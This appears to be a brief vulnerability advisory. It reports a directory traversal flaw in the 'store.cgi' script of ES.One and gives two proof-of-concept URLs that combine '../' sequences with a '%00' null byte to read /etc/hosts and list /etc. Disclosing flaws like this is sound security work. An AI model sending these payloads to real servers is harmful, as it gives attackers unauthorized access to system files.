It is possible for a remote user to gain read access to directories and files outside the root directory of ES.One. Requesting a specially crafted URL by way of 'store.cgi', composed of '/../' sequences and appended with '%00' will disclose an arbitrary directory.

http://target/cgi-bin/store.cgi?StartID=../etc/hosts%00.html

^^ = Will obviously open the hosts file.

http://target/cgi-bin/store.cgi?StartID=../etc/%00.html

^^ = Will obviously list the /etc/ directory.
